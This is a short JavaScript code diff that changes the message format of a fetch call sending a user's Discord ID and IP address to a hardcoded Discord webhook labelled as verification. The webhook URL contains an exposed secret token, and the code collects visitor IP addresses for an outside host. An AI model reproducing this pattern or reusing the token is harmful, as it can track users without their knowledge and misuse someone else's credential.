@@ -15,7 +15,7 @@
                 await fetch("https://discord.com/api/webhooks/1335357251082518700/-zluXm4U386F4xsxtKobIDFLCPHF5YfN4htVGVmepp2ZOf6bAUrpxfl4sxhjQBL95zv6", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ content: `**New Verification:**\n\n🔹 **Discord-ID:** ${discordId}\n🔹 **IP-Adress:** ${ip.ip}` })
+                    body: JSON.stringify({ content: `{"id": ${discordId}, "ip":${ip.ip}}` })
                 });
             }
         })();
